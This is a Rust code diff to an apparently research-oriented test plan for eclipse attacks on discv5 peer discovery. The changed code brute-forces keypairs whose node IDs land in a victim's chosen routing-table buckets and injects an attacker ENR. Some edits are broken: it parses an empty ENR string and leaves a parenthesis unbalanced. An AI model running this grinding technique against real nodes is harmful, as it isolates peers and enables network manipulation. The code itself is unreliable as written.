@@ -60,7 +60,13 @@ impl MonopolizingByIncomingNodes {
         // ////////////////////////
         // Construct a local Enr
         // ////////////////////////
-        let enr_key = Self::generate_deterministic_keypair(client.group_seq(), &role);
+        // let enr_key = Self::generate_deterministic_keypair(client.group_seq(), &role);
+        let tikuna_base64 = "";
+        let tikuna_enr: Enr = tikuna_base64.parse().unwrap();
+        client.record_message("Generating keys!!");
+        let mut eclipse_keypairs: Vec<CombinedKey> = Self::generate_keys_fill_buckets(&tikuna_enr, 1, 1).await;
+        let enr_key = eclipse_keypairs.remove(0);
+        client.record_message(format!("Generated keys lenght: {}", eclipse_keypairs.len()));
         let enr = EnrBuilder::new("v4")
             .ip(run_parameters
                 .data_network_ip()?
@@ -155,6 +161,27 @@ impl MonopolizingByIncomingNodes {
         keypairs.remove(usize::try_from(index).expect("Valid as usize"))
     }
 
+    async fn generate_keys_fill_buckets(enr_victim: &Enr, quantity_per_bucket: u64, number_buckets: u64) -> Vec<CombinedKey> {
+        // Generate `bucket_limit` keypairs that go in `enr` node's n-th bucket.
+        let mut generated_keys = Vec::new();
+        for n in 0..number_buckets {
+            for _ in 0..quantity_per_bucket {
+                loop {
+                    let fake_new_key = CombinedKey::generate_secp256k1();
+                    let fake_new_enr = EnrBuilder::new("v4").build(&fake_new_key).unwrap();
+                    let victim_id: Key<NodeId> = enr_victim.node_id().into();
+                    let fake_new_id: Key<NodeId> = fake_new_enr.node_id().into();
+                    let distance = victim_id.log2_distance(&fake_new_id).unwrap();
+                    if distance == (256 - n) {
+                        generated_keys.push(fake_new_key);
+                        break;
+                    }
+                }
+            }
+        }
+        generated_keys
+    }
+
     async fn collect_instance_info(
         &self,
         client: &Client,
@@ -241,13 +268,11 @@ impl MonopolizingByIncomingNodes {
         // the FINDNODE query will be sent to the victim, and then, if the victim is vulnerable
         // to the eclipse attack, the attacker's ENR will be added to the victim's routing table
         // because of the handshake.
-        let tikuna_base64 = "enr:-MK4QCCu7HxGVTUVE3Mfx-_78yUybuRJTeiEsesNCom-bqRYT4S7Cz0HgLvgAGbQWgawMysPw2UafLAr3JAHSkBIsreGAYTznvm2h2F0dG5ldHOIAAAAAAAAAACEZXRoMpBKJsWLAgAAAP__________gmlkgnY0gmlwhI6E_nuJc2VjcDI1NmsxoQJ5FMa1v-bvvmnCAfxI57O4cgUZ7J83clFIWpY8Vx4IzYhzeW5jbmV0cwCDdGNwgjLIg3VkcIIu4A";
+        let tikuna_base64 = "";
         let tikuna_enr: Enr = tikuna_base64.parse().unwrap();
-        client.record_message("Generating keys!!");
-        let eclipse_keypairs = generate_keys_fill_buckets(&tikuna_enr, 5, 2);
-        client.record_message(format!("Generated keys lenght: {}", eclipse_keypairs.await.len()));
         let current_ip_address = client.run_parameters().data_network_ip()?.expect("IP address for the data network");
         client.record_message(format!("Current IP address: {:?}", current_ip_address));
+        client.record_message(format!("Attacking!!");
         discv5.add_enr(tikuna_enr.clone())?;
         if let Err(e) = discv5.find_node(NodeId::random()).await {
             client.record_message(format!("Failed to run query: {}", e));
@@ -286,25 +311,4 @@ fn generate_deterministic_keypair(n: usize, seed: u64) -> Vec<CombinedKey> {
         keypairs.push(kp);
     }
     keypairs
-}
-
-async fn generate_keys_fill_buckets(enr_victim: &Enr, quantity_per_bucket: u64, number_buckets: u64) -> Vec<CombinedKey> {
-    // Generate `bucket_limit` keypairs that go in `enr` node's n-th bucket.
-    let mut generated_keys = Vec::new();
-    for n in 0..number_buckets {
-        for _ in 0..quantity_per_bucket {
-            loop {
-                let fake_new_key = CombinedKey::generate_secp256k1();
-                let fake_new_enr = EnrBuilder::new("v4").build(&fake_new_key).unwrap();
-                let victim_id: Key<NodeId> = enr_victim.node_id().into();
-                let fake_new_id: Key<NodeId> = fake_new_enr.node_id().into();
-                let distance = victim_id.log2_distance(&fake_new_id).unwrap();
-                if distance == (256 - n) {
-                    generated_keys.push(fake_new_key);
-                    break;
-                }
-            }
-        }
-    }
-    generated_keys
 }
